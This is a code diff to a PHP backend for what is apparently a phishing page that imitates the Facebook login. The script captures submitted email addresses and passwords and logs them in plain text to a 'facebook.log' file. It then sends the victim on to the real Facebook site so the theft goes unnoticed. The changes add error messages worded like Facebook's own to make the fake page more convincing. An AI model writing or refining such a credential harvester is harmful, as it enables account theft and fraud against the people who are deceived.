@@ -5,10 +5,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = $_POST['password']; // It's crucial to handle passwords securely
 
     // Validate email and password
-    if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        // Handle invalid email
+        echo "The email address or mobile number you entered isn't connected to an account.";
+    } elseif (strlen($password) < 8 || preg_match('/\s/', $password)) {
+        // Handle invalid password
+        echo "The password that you've entered is incorrect.";
+    } else {
         // Ensure the data directory exists
         if (!is_dir('../data')) {
             mkdir('../data', 0777, true);
+        }
+
+        // Ensure the logs directory exists
+        if (!is_dir('../logs')) {
+            mkdir('../logs', 0777, true);
         }
 
         // Save the data to a file securely
@@ -20,15 +31,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         error_log("Email: $email\nPassword: $password\n", 3, "../logs/facebook.log");
 
         // Redirect to the real Facebook login page
-        header("Location: https://facebook.com");
+        header("Location: https://www.facebook.com/");
         exit();
-    } else {
-        // Handle invalid input
-        echo 'Invalid email or password. Please try again.';
     }
-} else {
-    // If the form isn't submitted, redirect to the login page
-    header("Location: ../templates/facebook/index.html");
-    exit();
 }
 ?>
